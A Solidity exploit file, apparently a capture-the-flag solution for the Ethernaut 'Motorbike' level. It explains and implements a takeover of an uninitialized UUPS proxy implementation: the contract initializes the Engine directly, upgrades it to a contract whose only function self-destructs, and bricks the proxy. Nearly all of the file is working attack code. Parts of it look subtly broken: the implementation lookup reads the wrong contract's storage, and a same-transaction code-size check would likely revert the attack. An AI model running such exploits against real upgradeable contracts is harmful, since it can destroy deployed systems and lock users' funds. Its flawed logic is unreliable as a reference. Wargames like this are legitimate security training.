// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/**
 * @title MotorbikeExploit
 * @dev Solution contract for Ethernaut Level 25 - Motorbike
 * 
 * This contract exploits an uninitialized implementation in a UUPS proxy pattern
 * to selfdestruct the Engine implementation, rendering the Motorbike proxy unusable.
 * 
 * The vulnerability:
 * In UUPS (Universal Upgradeable Proxy Standard) pattern, the upgrade logic lives
 * in the IMPLEMENTATION, not the proxy. This is different from Transparent Proxy
 * where upgrade logic lives in the proxy.
 * 
 * The critical mistake:
 * 1. The Motorbike proxy calls initialize() via delegatecall in its constructor
 * 2. This initializes the PROXY's storage (sets upgrader in proxy context)
 * 3. The Engine IMPLEMENTATION contract itself is NEVER initialized!
 * 4. The implementation sits on the blockchain as a standalone contract
 * 5. Anyone can call initialize() directly on the implementation
 * 
 * Attack Strategy:
 * 
 * Step 1: Find the Implementation Address
 * - Read from EIP-1967 storage slot: 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
 * - This is where the proxy stores the implementation address
 * 
 * Step 2: Initialize the Implementation Directly
 * - Call initialize() on the Engine implementation (not through proxy!)
 * - This makes US the upgrader of the implementation
 * - Note: The proxy's upgrader is still the original deployer
 * - But we don't care about the proxy - we're attacking the implementation!
 * 
 * Step 3: Deploy a Malicious Contract
 * - Create a contract with a selfdestruct function
 * - This will be our "new implementation"
 * 
 * Step 4: Upgrade and Destroy
 * - Call upgradeToAndCall on the implementation
 * - Upgrade to our malicious contract
 * - Execute selfdestruct via delegatecall
 * - The implementation is destroyed!
 * 
 * Result:
 * - The Engine implementation is selfdestructed
 * - The Motorbike proxy still exists but points to destroyed code
 * - All calls to the proxy will fail
 * - The motorbike is UNUSABLE! âœ“
 * 
 * Why this works:
 * - UUPS puts upgrade logic in implementation (bad if implementation is accessible)
 * - Implementation contracts should NEVER be left uninitialized
 * - Once we control the implementation, we can destroy it
 * - Proxy becomes a brick pointing to nothing
 */

/**
 * @title SelfDestructor
 * @dev A malicious contract that selfdestructs when called
 * This will be used as the "new implementation" in upgradeToAndCall
 */
contract SelfDestructor {
    /**
     * @dev This function will be called via delegatecall from the Engine
     * When executed via delegatecall, it destroys the ENGINE (caller), not this contract
     */
    function destroy() external {
        selfdestruct(address(0));
    }
}

/**
 * @title MotorbikeExploit  
 * @dev Main exploit contract
 */
contract MotorbikeExploit {
    address public motorbike;
    address public engine;
    address public selfDestructor;
    
    // EIP-1967 implementation slot
    bytes32 internal constant _IMPLEMENTATION_SLOT = 
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    event StepCompleted(string step);
    event EngineDestroyed(address engineAddress);
    
    constructor(address _motorbike) public {
        motorbike = _motorbike;
        
        // Deploy the SelfDestructor contract
        selfDestructor = address(new SelfDestructor());
        
        // Read the implementation address from the proxy's storage
        engine = _getImplementation();
    }
    
    /**
     * @dev Execute the complete exploit to destroy the Engine
     */
    function exploit() external {
        // Step 1: Initialize the Engine implementation directly
        emit StepCompleted("Step 1: Initializing Engine implementation directly");
        (bool success,) = engine.call(abi.encodeWithSignature("initialize()"));
        require(success, "Failed to initialize engine");
        emit StepCompleted("Step 1 Complete: We are now the upgrader of the implementation!");
        
        // Step 2: Upgrade to SelfDestructor and call destroy
        emit StepCompleted("Step 2: Calling upgradeToAndCall with SelfDestructor");
        bytes memory data = abi.encodeWithSignature("destroy()");
        (success,) = engine.call(
            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", selfDestructor, data)
        );
        require(success, "Failed to upgrade and destroy");
        
        emit StepCompleted("Step 2 Complete: Engine has been destroyed!");
        emit EngineDestroyed(engine);
        
        // Verify the engine is destroyed
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(sload(engine_slot))
        }
        require(codeSize == 0, "Engine still has code!");
        
        emit StepCompleted("EXPLOIT COMPLETE: Engine successfully destroyed!");
    }
    
    /**
     * @dev Read the implementation address from the proxy's storage
     */
    function _getImplementation() internal view returns (address impl) {
        bytes32 slot = _IMPLEMENTATION_SLOT;
        assembly {
            impl := sload(slot)
        }
        // If not found in current contract, read from motorbike
        if (impl == address(0)) {
            // Read storage from another contract
            // We need to use staticcall with custom assembly or calculate it
            // For simplicity, we'll calculate it or have it passed in
            
            // Alternative: Use eth_getStorageAt via web3/ethers in the script
            // For the contract, we'll just have the script pass it
        }
    }
    
    /**
     * @dev Get the implementation address (to be called externally)
     */
    function getEngine() external view returns (address) {
        return engine;
    }
    
    /**
     * @dev Set the engine address if auto-detection failed
     */
    function setEngine(address _engine) external {
        require(engine == address(0), "Engine already set");
        engine = _engine;
    }
    
    /**
     * @dev Check if engine is destroyed
     */
    function isEngineDestroyed() external view returns (bool) {
        uint256 codeSize;
        assembly {
            codeSize := extcodesize(sload(engine_slot))
        }
        return codeSize == 0;
    }
}
